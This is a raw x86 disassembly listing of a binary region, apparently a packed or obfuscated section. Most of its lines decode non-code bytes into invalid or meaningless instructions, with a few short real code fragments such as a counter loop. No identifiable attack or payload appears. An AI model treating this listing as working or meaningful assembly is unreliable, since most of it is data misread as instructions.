  40f740:	retf   0xbfd5
  40f743:	push   ebp
  40f744:	lea    ebp,[edi*4+0x32f51dc7]
  40f74b:	les    ebx,FWORD PTR [ecx-0x57b6d53]
  40f751:	jmp    0x40f7ac
  40f753:	xchg   BYTE PTR [ecx-0x3],ch
  40f756:	nop
  40f757:	mov    bl,0xd
  40f759:	pop    ebp
  40f75a:	jecxz  0x40f765
  40f75c:	out    0xd7,eax
  40f75e:	jae    0x40f724
  40f760:	push   ds
  40f761:	push   ebx
  40f762:	cmp    ebp,edx
  40f764:	pop    edx
  40f765:	std    
  40f766:	cmp    al,0xff
  40f768:	hlt    
  40f769:	fs (bad) 
  40f76c:	sbb    BYTE PTR [edx],dh
  40f76e:	pushf  
  40f76f:	or     BYTE PTR [ecx-0x2],0x89
  40f773:	xchg   ebp,eax
  40f774:	or     bh,BYTE PTR [ecx+0x76717ab7]
  40f77a:	fldcw  WORD PTR [ebp+0x39]
  40f77d:	mov    bl,bl
  40f77f:	bound  esi,QWORD PTR [edx+0x2d]
  40f782:	inc    ebx
  40f783:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f784:	xor    ebp,edx
  40f786:	pop    ds
  40f787:	push   ds
  40f788:	scas   eax,DWORD PTR es:[edi]
  40f789:	sub    al,0xb9
  40f78b:	inc    ebp
  40f78c:	sbb    DWORD PTR [edx+0x23dd925a],esp
  40f792:	jnp    0x40f75f
  40f794:	jne    0x40f7f2
  40f796:	or     edx,DWORD PTR [edx]
  40f798:	es push ebp
  40f79a:	(bad)  
  40f79c:	cmp    eax,0x2d38c5d4
  40f7a1:	sub    ebp,eax
  40f7a3:	mov    eax,0xf38854d8
  40f7a8:	popf   
  40f7a9:	aas    
  40f7aa:	jp     0x40f7c7
  40f7ac:	add    al,0x29
  40f7ae:	fstp   st(5)
  40f7b0:	add    BYTE PTR [edi+0x1c4df084],ah
  40f7b6:	jae    0x40f7bf
  40f7b8:	out    0x15,eax
  40f7ba:	das    
  40f7bb:	mov    BYTE PTR [esi],dl
  40f7bd:	xchg   esi,eax
  40f7be:	mov    bl,0x32
  40f7c0:	imul   ecx,DWORD PTR [edi-0x6938b9f2],0x5f98b83e
  40f7ca:	push   ebx
  40f7cb:	mov    dh,0x76
  40f7cd:	or     ah,dh
  40f7cf:	daa    
  40f7d0:	and    dl,dh
  40f7d2:	call   0x3a80:0x969df27
  40f7d9:	inc    edi
  40f7da:	push   ss
  40f7db:	push   ds
  40f7dc:	xor    BYTE PTR [ebp-0x422d5fa9],cl
  40f7e2:	pop    edx
  40f7e3:	mov    BYTE PTR ds:0x39382de,dl
  40f7e9:	sar    DWORD PTR [ebx],1
  40f7eb:	cli    
  40f7ec:	mov    DWORD PTR ds:0x42a779,0x7d48
  40f7f6:	jmp    0x40fa7e
  40f7fb:	ret    0xc9cd
  40f7fe:	ret    
  40f7ff:	(bad)  
  40f801:	retf   0x10cd
  40f804:	test   BYTE PTR ds:0x48a7b55f,ch
  40f80a:	xchg   edx,eax
  40f80b:	and    BYTE PTR [edi+0x78],al
  40f80e:	js     0x40f7f5
  40f810:	jle    0x40f88a
  40f812:	js     0x40f7ac
  40f814:	outs   dx,DWORD PTR ds:[esi]
  40f815:	xchg   edi,eax
  40f816:	adc    eax,0x51962f6c
  40f81b:	or     eax,0x4954051
  40f820:	call   0x590f13
  40f825:	ret    0x1c6a
  40f828:	in     al,dx
  40f829:	dec    esp
  40f82a:	xchg   ebx,eax
  40f82b:	dec    ebx
  40f82c:	xchg   ecx,eax
  40f82d:	cli    
  40f82e:	push   cs
  40f82f:	xchg   edi,eax
  40f830:	in     al,0x2b
  40f832:	inc    esp
  40f833:	in     al,0x66
  40f835:	jbe    0x40f87f
  40f837:	pop    es
  40f838:	neg    BYTE PTR [ebp-0x5cf42a8e]
  40f83e:	je     0x40f80d
  40f840:	mov    dl,0xa
  40f842:	xor    BYTE PTR [ecx-0x63aab033],0xa1
  40f849:	mov    ds:0x762a1d7a,eax
  40f84e:	add    al,BYTE PTR [eax-0xfa50174]
  40f854:	xchg   ebx,eax
  40f855:	jo     0x40f856
  40f857:	inc    edi
  40f858:	jo     0x40f87d
  40f85a:	jnp    0x40f829
  40f85c:	or     eax,0x499cc918
  40f861:	xlat   BYTE PTR ds:[ebx]
  40f862:	and    eax,0xc095c499
  40f867:	push   es
  40f868:	nop
  40f869:	pop    esi
  40f86a:	imul   esi,DWORD PTR [eax],0x6ebedcce
  40f870:	inc    ecx
  40f871:	sub    al,0x8f
  40f873:	ss ror dh,1
  40f876:	jne    0x40f859
  40f878:	gs call 0x4ce85845
  40f87e:	pusha  
  40f87f:	pop    esi
  40f880:	inc    esi
  40f881:	ja     0x40f845
  40f883:	pop    es
  40f884:	cmp    al,0x69
  40f886:	lds    ecx,FWORD PTR [edx-0x1920e712]
  40f88c:	sahf   
  40f88d:	mov    ebx,ecx
  40f88f:	sbb    ch,BYTE PTR [ecx-0x7b]
  40f892:	imul   eax,DWORD PTR [ebp+ebx*8+0x27ce5c8b],0x7
  40f89a:	or     ch,BYTE PTR [ebx]
  40f89c:	or     eax,0x26f4c8d0
  40f8a1:	inc    edx
  40f8a2:	jae    0x40f8f7
  40f8a4:	mov    dh,0x93
  40f8a6:	or     eax,0x87b0845
  40f8ab:	and    BYTE PTR [eax+0x1652fc5d],0xc4
  40f8b2:	cs cs ja 0x40f84e
  40f8b6:	cs jmp 0xcbcfa74
  40f8bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8bd:	adc    esi,DWORD PTR [ecx-0x772e852e]
  40f8c3:	jp     0x40f8f8
  40f8c5:	imul   esp,esi,0xffffffbf
  40f8c8:	scas   eax,DWORD PTR es:[edi]
  40f8c9:	sub    esi,esp
  40f8cb:	push   esi
  40f8cc:	pushf  
  40f8cd:	push   es
  40f8ce:	shr    BYTE PTR [eax-0x13b6a4c8],0xac
  40f8d5:	sbb    ch,BYTE PTR [edi+0x12]
  40f8d8:	std    
  40f8d9:	repz pop edi
  40f8db:	inc    ebp
  40f8dc:	xor    dh,BYTE PTR [edx-0xd]
  40f8df:	and    esi,DWORD PTR [edx]
  40f8e1:	in     eax,dx
  40f8e2:	mov    bh,0xbd
  40f8e4:	imul   eax,DWORD PTR [ebx],0xffffff94
  40f8e7:	mov    ebx,0x2153ed4
  40f8ec:	pop    ds
  40f8ed:	cmp    BYTE PTR [ebp+0x68],dh
  40f8f0:	addr16 mov ds:0x5336,al
  40f8f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8f5:	sbb    BYTE PTR [edx+0x41669e27],dl
  40f8fb:	lea    ecx,ds:0x139ca3c8
  40f901:	jg     0x40f92d
  40f903:	bound  ebp,QWORD PTR [ebp-0x4e]
  40f906:	lahf   
  40f907:	jns    0x40f971
  40f909:	addr16 mov bl,0xa8
  40f90c:	push   edi
  40f90d:	bound  edi,QWORD PTR [ecx]
  40f90f:	cmp    dl,BYTE PTR [ebx-0x28db8eb7]
  40f915:	clc    
  40f916:	ret    0xd9e0
  40f919:	inc    edx
  40f91a:	xor    edx,0x8e3f19f9
  40f920:	call   FWORD PTR fs:[ebx-0x4673e2d0]
  40f927:	xchg   esi,eax
  40f928:	jbe    0x40f973
  40f92a:	(bad)  
  40f92b:	fsubr  DWORD PTR [ebp+0x191dbadb]
  40f931:	icebp  
  40f932:	xchg   ecx,eax
  40f933:	inc    ecx
  40f934:	or     eax,0x570fece5
  40f939:	mov    edx,0x954e4282
  40f93e:	adc    eax,0xe593936f
  40f943:	sub    eax,ebp
  40f945:	or     eax,0xe0e751ea
  40f94a:	and    esi,edi
  40f94c:	mov    ch,0x34
  40f94e:	jb     0x40f93a
  40f950:	(bad)  
  40f951:	dec    ebx
  40f952:	pop    ecx
  40f953:	push   es
  40f954:	shrd   DWORD PTR [eax+0x4b],edi,0xd7
  40f959:	cwde   
  40f95a:	rcl    ecx,0xf9
  40f95d:	jl     0x40f8e6
  40f95f:	fsubrp st(4),st
  40f961:	ret    
  40f962:	push   edx
  40f963:	fadd   st(7),st
  40f965:	mov    esp,0x346b70ba
  40f96a:	ins    BYTE PTR es:[edi],dx
  40f96b:	adc    al,0x45
  40f96d:	jmp    0x5846fbf0
  40f972:	cmp    eax,esp
  40f974:	jo     0x40f9d5
  40f976:	stc    
  40f977:	shl    BYTE PTR [edi+0x6b41a1aa],0xed
  40f97e:	jne    0x40f998
  40f980:	fistp  QWORD PTR [edi+0x5c0d21fc]
  40f986:	mov    ah,0x9c
  40f988:	dec    esi
  40f989:	out    0xf4,al
  40f98b:	loope  0x40f950
  40f98d:	fwait
  40f98e:	pop    edx
  40f98f:	rcl    cl,1
  40f991:	jl     0x40f920
  40f993:	add    esp,ebx
  40f995:	inc    ebx
  40f996:	dec    bp
  40f998:	repz test BYTE PTR [ebp-0x7d72de32],bl
  40f99f:	(bad)  
  40f9a0:	in     al,dx
  40f9a1:	hlt    
  40f9a2:	mov    dh,0xb8
  40f9a4:	fs ds mov dl,0x19
  40f9a8:	fmul   DWORD PTR [edx]
  40f9aa:	bound  edx,QWORD PTR [edx-0x2e]
  40f9ad:	arpl   WORD PTR [esi-0x6d],di
  40f9b0:	ins    DWORD PTR es:[edi],dx
  40f9b1:	ret    0x9e9f
  40f9b4:	cdq    
  40f9b5:	sbb    DWORD PTR [eax+eax*1],edx
  40f9b8:	sub    DWORD PTR [edi],edi
  40f9ba:	pop    es
  40f9bb:	jle    0x40f9d0
  40f9bd:	sahf   
  40f9be:	adc    edi,DWORD PTR [edx+0x29]
  40f9c1:	paddsw mm5,QWORD PTR [eax-0x69]
  40f9c5:	jl     0x40f987
  40f9c7:	inc    esi
  40f9c8:	sar    DWORD PTR [ecx+0x2c4db369],1
  40f9ce:	xor    al,0xd1
  40f9d0:	jo     0x40f987
  40f9d2:	cmp    DWORD PTR [ebx],ecx
  40f9d4:	mov    ebp,0xedfbc9f7
  40f9d9:	ja     0x40f992
  40f9db:	loop   0x40f9be
  40f9dd:	pop    ss
  40f9de:	jle    0x40f9a8
  40f9e0:	fidiv  WORD PTR [edx-0x50bb85e0]
  40f9e6:	out    dx,eax
  40f9e7:	lods   al,BYTE PTR ds:[esi]
  40f9e8:	jo     0x40f9cc
  40f9ea:	stos   BYTE PTR es:[edi],al
  40f9eb:	aaa    
  40f9ec:	out    dx,al
  40f9ed:	popf   
  40f9ee:	shr    DWORD PTR [ebx+0x11676919],0x9c
  40f9f5:	sub    BYTE PTR [ecx+ecx*8-0x59088350],ch
  40f9fc:	xchg   edi,eax
  40f9fd:	les    edx,FWORD PTR [esi]
  40f9ff:	dec    DWORD PTR [edx+ecx*1]
  40fa02:	imul   esp,DWORD PTR [edx-0x3e4d81e6],0x85462766
  40fa0c:	push   0x21d3f3b1
  40fa11:	pop    edx
  40fa12:	inc    edi
  40fa13:	adc    ah,BYTE PTR [edx-0x45455585]
  40fa19:	(bad)  [ebp-0x7b]
  40fa1c:	cmp    eax,0xa4e3e697
  40fa21:	mov    eax,ds:0x9ddb0b15
  40fa26:	iret   
  40fa27:	mov    esi,0x601301c8
  40fa2c:	das    
  40fa2d:	dec    esp
  40fa2e:	dec    ecx
  40fa2f:	or     ah,BYTE PTR [ecx+0x3c]
  40fa32:	sbb    eax,0xb16ad1ad
  40fa37:	cmp    ecx,DWORD PTR [edx-0xb]
  40fa3a:	loop   0x40f9dc
  40fa3c:	lods   eax,DWORD PTR ds:[esi]
  40fa3d:	leave  
  40fa3e:	add    esp,DWORD PTR [esi+ecx*2]
  40fa41:	aam    0x6b
  40fa43:	sti    
  40fa44:	sar    DWORD PTR [eax+0x7c],cl
  40fa47:	fadd   QWORD PTR [eax+0x5e]
  40fa4a:	add    esi,eax
  40fa4c:	mov    ebp,0x5e453cd8
  40fa51:	sub    eax,0xe30b6bc
  40fa56:	jl     0x40fa09
  40fa58:	inc    edx
  40fa59:	pop    ebp
  40fa5a:	or     bl,BYTE PTR [ebp-0x63]
  40fa5d:	ss adc al,0x64
  40fa60:	inc    ebp
  40fa61:	xchg   dh,cl
  40fa63:	sub    al,0x10
  40fa65:	mov    DWORD PTR [ecx],edi
  40fa67:	xchg   esi,eax
  40fa68:	shl    BYTE PTR [ecx+0x60],0x5c
  40fa6c:	fmul   QWORD PTR [ebp-0x16]
  40fa6f:	push   ds
  40fa70:	ins    DWORD PTR es:[edi],dx
  40fa71:	sbb    bl,bh
  40fa73:	je     0x40fab5
  40fa75:	pusha  
  40fa76:	mov    edi,0xb356d7e6
  40fa7b:	test   eax,0x840f996e
  40fa80:	stos   DWORD PTR es:[edi],eax
  40fa81:	push   ebx
  40fa82:	add    BYTE PTR [eax],al
  40fa84:	push   ebx
  40fa85:	mov    DWORD PTR ds:0x42a809,0x5779
  40fa8f:	jmp    0x4148fa
  40fa94:	mov    DWORD PTR ds:0x42a7c1,0x1b
  40fa9e:	cmp    DWORD PTR ds:0x42a7c1,0x0
  40faa5:	je     0x40faf7
  40faab:	cmp    DWORD PTR ds:0x42a7c1,0x7
  40fab2:	jne    0x40facb
  40fab8:	push   0x6ecd
  40fabd:	push   0x4c4c
  40fac2:	push   DWORD PTR [ebp-0x1c]
  40fac5:	call   DWORD PTR ds:0x41d1a8
  40facb:	cmp    DWORD PTR ds:0x42a7c1,0x8
  40fad2:	jne    0x40fae5
  40fad8:	mov    edi,DWORD PTR ds:0x42a7c1
  40fade:	dec    edi
  40fadf:	mov    DWORD PTR ds:0x42a7c1,edi
  40fae5:	mov    edi,DWORD PTR ds:0x42a7c1
  40faeb:	dec    edi
  40faec:	mov    DWORD PTR ds:0x42a7c1,edi
  40faf2:	jmp    0x40fa9e
  40faf7:	mov    edx,DWORD PTR [ebp-0x8]
  40fafa:	mov    edi,DWORD PTR [ebp-0x10]
  40fafd:	jmp    0x40fd85
  40fb02:	cmp    eax,0xd9c7c9d6
  40fb07:	fcmovnb st,st(1)
  40fb09:	(bad)  
  40fb0a:	cmc    
  40fb0b:	into   
  40fb0c:	inc    edx
  40fb0d:	jge    0x40fb5b
  40fb0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb10:	xor    eax,0x78458dee
  40fb15:	js     0x40fafc
  40fb17:	jle    0x40fb91
  40fb19:	js     0x40fb8c
  40fb1b:	adc    bl,BYTE PTR [ebx-0x4dac7aa9]
  40fb21:	(bad)  
  40fb22:	push   ds
  40fb23:	push   0x20
  40fb25:	(bad)  
  40fb26:	mov    edi,0x9b157fd8
  40fb2b:	test   BYTE PTR [esp-0x152e93a1],0xb8
  40fb33:	loop   0x40fb64
  40fb35:	jle    0x40fb1a
  40fb37:	push   ebx
  40fb38:	jge    0x40fad0
  40fb3a:	lds    edx,FWORD PTR [ecx+0x20]
  40fb3d:	sbb    eax,0xbfdd2e5
  40fb42:	xor    eax,0xee544f06
  40fb47:	pop    DWORD PTR [eax]
  40fb49:	sti    
  40fb4a:	pop    esi
  40fb4b:	mov    ah,BYTE PTR [eax-0x77e4c898]
  40fb51:	shl    eax,cl
  40fb53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb54:	dec    ebp
  40fb55:	addr16 add esi,ecx
  40fb58:	or     dh,cl
  40fb5a:	loop   0x40fbd0
  40fb5c:	jge    0x40fbcd
  40fb5e:	cs mov ecx,0x8e54c821
  40fb64:	rcr    BYTE PTR [ebx+0x5d],1
  40fb67:	mov    al,0x18
  40fb69:	jbe    0x40fb44
  40fb6b:	fdivr  QWORD PTR es:[esi]
  40fb6e:	mov    dl,0x8b
  40fb70:	pusha  
  40fb71:	ds fsubp st(4),st
  40fb74:	ss gs or ax,0x1295
  40fb7a:	mov    eax,ds:0x1b649c84
  40fb7f:	sub    DWORD PTR [ebp-0x2d],0x90a8489d
  40fb86:	add    DWORD PTR [esi+0x45],esp
  40fb89:	ins    DWORD PTR es:[edi],dx
  40fb8a:	ins    DWORD PTR es:[edi],dx
  40fb8b:	dec    ebp
  40fb8c:	xor    eax,0x63271cd3
  40fb91:	inc    esi
  40fb92:	adc    ebx,DWORD PTR [esi-0x4a]
  40fb95:	imul   DWORD PTR [ebx-0x2e]
  40fb98:	pop    ebx
  40fb99:	mov    bh,BYTE PTR [edx]
  40fb9b:	addr16 pop eax
  40fb9d:	push   esp
  40fb9e:	and    eax,0x52be2e12
  40fba3:	push   cs
  40fba4:	out    dx,al
  40fba5:	sbb    eax,0x823feb75
  40fbaa:	sub    al,BYTE PTR ds:0x86f6ea25
  40fbb0:	cmp    BYTE PTR [ebp-0x15504555],dl
  40fbb6:	inc    edi
  40fbb7:	rcr    DWORD PTR [esp+esi*8-0x5f5b23c9],0xb5
  40fbbf:	sbb    al,0x53
  40fbc1:	and    bh,ch
  40fbc3:	fs push ds
  40fbc5:	loopne 0x40fb80
  40fbc7:	sbb    eax,0xaa9190a4
  40fbcc:	sub    eax,0x6002c608
  40fbd1:	sbb    BYTE PTR [edi-0x18cda8d1],dl
  40fbd7:	aam    0xf4
  40fbd9:	call   0x9b67:0xca329510
  40fbe0:	mov    edx,0x67829a3e
  40fbe5:	clc    
  40fbe6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbe7:	add    dh,BYTE PTR [ecx-0x42beb100]
  40fbed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbee:	dec    edx
  40fbef:	ins    DWORD PTR es:[edi],dx
  40fbf0:	ficom  WORD PTR [eax+0x7211bbdf]
  40fbf6:	adc    BYTE PTR [eax-0x6d2faca4],al
  40fbfc:	mov    ds:0x84d77344,al
  40fc01:	pushf  
  40fc02:	daa    
  40fc03:	cmp    DWORD PTR [edi-0x9],esi
  40fc06:	xchg   edi,eax
  40fc07:	pop    edi
  40fc08:	call   0x7f0ceff2
  40fc0d:	ds enter 0xf446,0x99
  40fc12:	inc    esp
  40fc13:	mov    bl,0x7
  40fc15:	or     DWORD PTR [eax+ebx*4],ebp
  40fc18:	or     BYTE PTR [eax-0x75],bh
  40fc1b:	mov    esi,0xa1bc1026
  40fc20:	es pop ds
  40fc22:	mulps  xmm5,XMMWORD PTR [edx+0x4efba1e9]
  40fc29:	dec    eax
  40fc2a:	mov    dh,0x61
  40fc2c:	push   eax
  40fc2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc2e:	push   ebx
  40fc2f:	push   ebp
  40fc30:	xor    al,0x67
  40fc32:	dec    esp
  40fc33:	pop    esi
  40fc34:	jmp    0xb24f:0xc899baad
  40fc3b:	and    al,0x29
  40fc3d:	push   edx
  40fc3e:	js     0x40fc19
  40fc40:	call   0x61265ff6
  40fc45:	sti    
  40fc46:	cmp    al,0x41
  40fc48:	jo     0x40fc40
  40fc4a:	pop    esp
  40fc4b:	call   0x1796:0xf02addc0
  40fc52:	xor    eax,0x52cd77f9
  40fc57:	leave  
  40fc58:	push   ecx
  40fc59:	mov    WORD PTR [ebx-0x5e],es
  40fc5c:	frstor [esi]
  40fc5e:	pushf  
  40fc5f:	mov    ecx,0x9e964161
  40fc64:	(bad)  
  40fc65:	(bad)  
  40fc66:	mov    DWORD PTR [ebp+0x50],ebx
  40fc69:	outs   dx,DWORD PTR ds:[esi]
  40fc6a:	add    eax,0x25685a65
  40fc6f:	cmc    
  40fc70:	dec    esp
  40fc71:	pop    ebp
  40fc72:	xor    al,BYTE PTR [edi+0x67]
  40fc75:	adc    al,0xa
  40fc77:	add    ebx,esi
  40fc79:	cli    
  40fc7a:	or     al,0xed
  40fc7c:	push   esp
  40fc7d:	sbb    eax,0x5383a6d8
  40fc82:	xchg   edi,eax
  40fc83:	sub    al,0xf1
  40fc85:	sbb    bl,0x34
  40fc88:	(bad)  
  40fc8b:	mov    bl,0xf4
  40fc8d:	inc    edx
  40fc8e:	outs   dx,BYTE PTR ds:[esi]
  40fc8f:	dec    eax
  40fc90:	call   0x663c86fb
  40fc95:	push   eax
  40fc96:	add    BYTE PTR [esp+ebx*4+0x6f346ff8],bl
  40fc9d:	adc    al,0xa6
  40fc9f:	cdq    
  40fca0:	sahf   
  40fca1:	cmp    cl,BYTE PTR [edx-0x133b725a]
  40fca7:	inc    esi
  40fca8:	not    BYTE PTR [ebx-0x153634a9]
  40fcae:	push   esi
  40fcaf:	fs into 
  40fcb1:	jge    0x40fcee
  40fcb3:	lods   eax,DWORD PTR ds:[esi]
  40fcb4:	in     al,0xbc
  40fcb6:	shl    BYTE PTR [esi+0x37],0x77
  40fcba:	js     0x40fc5a
  40fcbc:	push   0x8d78ee9d
  40fcc1:	out    0x97,al
  40fcc3:	mov    bl,BYTE PTR gs:[ebx+0x75]
  40fcc7:	cmp    ebx,DWORD PTR [edx+0x1d6ec5d3]
  40fccd:	sub    ebp,DWORD PTR [ecx+0x3]
  40fcd0:	out    dx,al
  40fcd1:	arpl   sp,si
  40fcd3:	repz call 0x3d1f2db8
  40fcd9:	xchg   esp,eax
  40fcda:	jl     0x40fcaf
  40fcdc:	lahf   
  40fcdd:	mov    al,0xf3
  40fcdf:	or     DWORD PTR [ecx+0x71],0x6d5e44e9
  40fce6:	sub    al,0x4c
  40fce8:	jmp    0xf1c:0x65532ee1
  40fcef:	and    cl,ch
  40fcf1:	cli    
  40fcf2:	repnz or ah,0xa2
  40fcf6:	bound  edi,QWORD PTR [edi+edx*4+0x5e2c4e66]
  40fcfd:	adc    dh,BYTE PTR [edx-0x7]
  40fd00:	cmp    bh,ch
  40fd02:	ja     0x40fcc0
  40fd04:	cmp    ah,0x25
  40fd07:	test   BYTE PTR [esi-0x1f],cl
  40fd0a:	fisub  WORD PTR [edx]
  40fd0c:	dec    eax
  40fd0d:	sbb    DWORD PTR [esi],ecx
  40fd0f:	lock cmc 
  40fd11:	mov    al,0x17
  40fd13:	retf   
  40fd14:	shl    DWORD PTR [ecx-0x35ff9487],0x8e
  40fd1b:	sbb    BYTE PTR [ebp+0x524669fa],dh
  40fd21:	ja     0x40fd82
  40fd23:	lods   eax,DWORD PTR ds:[esi]
  40fd24:	fwait
  40fd25:	mov    dl,0x23
  40fd27:	xlat   BYTE PTR ds:[ebx]
  40fd28:	test   eax,0x1a4aebd3
  40fd2d:	outs   dx,DWORD PTR ds:[esi]
  40fd2e:	fnstcw WORD PTR [ebx+0x2bdf846c]
  40fd34:	adc    dl,bl
  40fd36:	push   0xffffffce
  40fd38:	test   al,dl
  40fd3a:	iret   
  40fd3b:	lods   al,BYTE PTR ds:[esi]
  40fd3c:	jl     0x40fdb4
  40fd3e:	dec    edx
  40fd3f:	xchg   ecx,eax
  40fd40:	dec    ecx
  40fd41:	hlt    
  40fd42:	aad    0xbc
  40fd44:	xor    ebp,edi
  40fd46:	inc    ecx
  40fd47:	aam    0xf9
  40fd49:	dec    ecx
  40fd4a:	and    al,0x3e
  40fd4c:	adc    DWORD PTR [esi+0x52ff8f9b],edx
  40fd52:	cli    
  40fd53:	push   esi
  40fd54:	adc    DWORD PTR [ebp-0x50ef7932],0x6a253479
  40fd5e:	jge    0x40fd7f
  40fd60:	cdq    
  40fd61:	ss loopne 0x40fdd8
  40fd64:	leave  
  40fd65:	mov    si,0x69c1
  40fd69:	jecxz  0x40fdaf
  40fd6b:	mov    ecx,0x1d9b1f2
  40fd70:	je     0x40fd5c
  40fd72:	sub    eax,0x4ad917a
  40fd77:	stos   BYTE PTR es:[edi],al
  40fd78:	adc    esp,ebx
  40fd7a:	sti    
  40fd7b:	jge    0x40fdce
  40fd7d:	and    bl,BYTE PTR [ebx+eiz*8-0x7c]
  40fd81:	push   ss
  40fd82:	sti    
  40fd83:	jbe    0x40fd32
  40fd85:	sub    edi,edx
  40fd87:	mov    edx,DWORD PTR [ebp-0x4]
  40fd8a:	xor    edx,eax
  40fd8c:	add    edx,ecx
  40fd8e:	cmp    edi,edx
  40fd90:	jb     0x414e2e
  40fd96:	mov    edx,DWORD PTR [ebp-0x28]
  40fd99:	mov    edi,DWORD PTR [ebp-0x4]
  40fd9c:	xor    edx,eax
  40fd9e:	xor    edi,eax
  40fda0:	add    edi,ecx
  40fda2:	add    edx,ecx
  40fda4:	imul   edx,edi
  40fda7:	mov    edi,DWORD PTR [ebp-0x8]
  40fdaa:	jmp    0x410032
  40fdaf:	mov    ecx,0xcac93ec5
  40fdb5:	(bad)  
  40fdb6:	leave  
  40fdb7:	dec    esp
  40fdb8:	mov    bl,0x33
  40fdba:	std    
  40fdbb:	adc    DWORD PTR [esi+0x3c],eax
  40fdbe:	inc    edx
  40fdbf:	jp     0x40fe0c
  40fdc1:	js     0x40fe3b
  40fdc3:	in     eax,0x7e
  40fdc5:	js     0x40fe3f
  40fdc7:	out    0xf,al
  40fdc9:	nop
  40fdca:	(bad)  
  40fdcb:	cmp    edi,DWORD PTR [ebx+0x5b1aaae6]
  40fdd1:	(bad)  
  40fdd2:	mov    dh,0xa0
  40fdd4:	xor    cl,BYTE PTR [edx+ebp*4+0x6cfd035c]
  40fddb:	in     al,0x8c
  40fddd:	call   0xde05:0x70d114a8
  40fde4:	iret   
  40fde5:	sub    DWORD PTR [edx-0x452d56f2],esp
  40fdeb:	xchg   ebp,eax
  40fdec:	xchg   ebx,eax
  40fded:	adc    BYTE PTR [eax+0x7ea8823c],dh
  40fdf3:	and    al,0x29
  40fdf5:	cmp    ebx,DWORD PTR [edx]
  40fdf7:	adc    eax,0x6fc3371c
  40fdfc:	fsub   DWORD PTR [ebx+0x16f16f76]
  40fe02:	mov    ebp,0xd24e6878
  40fe07:	mov    cl,0x24
  40fe09:	pop    ebx
  40fe0a:	mov    ds:0xee8edbb,al
  40fe0f:	mov    dl,BYTE PTR [eax+edi*8]
  40fe12:	aas    
  40fe13:	out    dx,eax
  40fe14:	dec    ebp
  40fe15:	mov    cl,0xfd
  40fe17:	mov    dh,0xf6
  40fe19:	sbb    edi,eax
  40fe1b:	mov    edx,0x4c0f67af
  40fe20:	(bad)  
  40fe22:	pop    esi
  40fe23:	ja     0x40fe28
  40fe25:	ss jo  0x40fe89
  40fe28:	out    0xa7,al
  40fe2a:	pop    ebp
  40fe2b:	gs jne 0x40fe70
  40fe2e:	rol    BYTE PTR [ecx-0x3274c8c7],0xb8
  40fe35:	arpl   WORD PTR [esi],bp
  40fe37:	ja     0x40fe9c
  40fe39:	test   ah,bl
  40fe3b:	adc    edx,edx
  40fe3d:	lods   al,BYTE PTR ds:[esi]
  40fe3e:	pcmpgtw mm2,QWORD PTR [esi]
  40fe41:	lea    edx,[eax]
  40fe43:	fstp   TBYTE PTR [esi+0x2293ec22]
  40fe49:	mov    ch,0x40
  40fe4b:	into   
  40fe4c:	sbb    ecx,DWORD PTR [ebp+0x4a]
  40fe4f:	fcom   DWORD PTR fs:[ebx+0x4bc47f95]
  40fe56:	pusha  
  40fe57:	jp     0x40fe94
  40fe59:	cmp    BYTE PTR [edx-0x4105b03],0xf5
  40fe60:	dec    ebp
  40fe61:	sub    al,0xb7
  40fe63:	std    
  40fe64:	jne    0x40fe59
  40fe66:	jne    0x40fead
  40fe68:	lods   al,BYTE PTR ds:[esi]
  40fe69:	pop    es
  40fe6a:	cmp    eax,edx
  40fe6c:	jg     0x40fe65
  40fe6e:	xchg   esi,eax
  40fe6f:	and    dh,ch
  40fe71:	jns    0x40fe44
  40fe73:	or     BYTE PTR [eax+0x595cabe7],bl
  40fe79:	ret    
  40fe7a:	cwde   
  40fe7b:	adc    dh,ah
  40fe7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe7e:	push   edx
  40fe7f:	push   ss
  40fe80:	xchg   BYTE PTR [edi+0x43],bh
  40fe83:	arpl   WORD PTR [edi+0x54c73810],cx
  40fe89:	mov    ch,0xf
  40fe8b:	sahf   
  40fe8c:	loope  0x40fef9
  40fe8e:	mov    ebp,DWORD PTR [ebx+0x55eebc7b]
  40fe94:	mov    cs,WORD PTR [edx+ecx*4-0x4a]
  40fe98:	cld    
  40fe99:	xor    cl,0x39
  40fe9c:	pop    es
  40fe9d:	xor    al,0xbf
  40fe9f:	pop    es
  40fea0:	xchg   ebp,eax
  40fea1:	jnp    0x40fe83
  40fea3:	ror    edx,cl
  40fea5:	ins    BYTE PTR es:[edi],dx
  40fea6:	leave  
  40fea7:	aas    
  40fea8:	imul   ebp,DWORD PTR [esi+0xc3745cb],0xffffff89
  40feaf:	xchg   ebx,eax
  40feb0:	inc    ecx
  40feb1:	ret    0x7df3
  40feb4:	jle    0x40fec8
  40feb6:	add    esi,0x1a
  40feb9:	mov    al,ds:0xa07cb7c9
  40febe:	stc    
  40febf:	push   edi
  40fec0:	add    eax,0x89952841
  40fec5:	cmp    eax,DWORD PTR [edx+ebp*2]
  40fec8:	xchg   edx,eax
  40fec9:	lahf   
  40feca:	inc    ebp
  40fecb:	es cmc 
  40fecd:	lods   al,BYTE PTR ds:[esi]
  40fece:	dec    esi
  40fecf:	dec    esi
  40fed0:	pop    eax
  40fed1:	ins    BYTE PTR es:[edi],dx
  40fed2:	out    0xe,eax
  40fed4:	jb     0x40ff0b
  40fed6:	xchg   edi,eax
  40fed7:	scas   al,BYTE PTR es:[edi]
  40fed8:	scas   eax,DWORD PTR es:[edi]
  40fed9:	scas   al,BYTE PTR es:[edi]
  40feda:	out    dx,eax
  40fedb:	xor    ecx,eax
  40fedd:	clc    
  40fede:	inc    ecx
  40fedf:	add    BYTE PTR [esi+0x42f74293],0x32
  40fee6:	daa    
  40fee7:	(bad)  
  40fee8:	mov    esp,0x8bc26dbe
  40feed:	cmp    ebp,ebx
  40feef:	pusha  
  40fef0:	popa   
  40fef1:	sub    DWORD PTR [esi+0x5002ad9a],edx
  40fef7:	push   ss
  40fef8:	mov    dl,0x91
  40fefa:	ins    DWORD PTR es:[edi],dx
  40fefb:	xchg   ebp,ecx
  40fefd:	pop    esp
  40fefe:	int3   
  40feff:	ss cmc 
